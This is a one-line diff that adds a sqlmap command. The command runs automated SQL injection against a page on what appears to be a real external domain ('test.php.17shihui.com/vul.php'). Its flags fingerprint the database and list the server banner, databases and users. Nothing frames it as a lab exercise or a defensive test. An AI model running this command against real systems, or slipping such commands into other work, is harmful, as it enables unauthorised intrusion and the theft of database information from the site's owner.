@@ -1,0 +1,1 @@
+ python sqlmap.py -u "http://test.php.17shihui.com/vul.php?id=1" -v 3 -f --banner --dbs --users
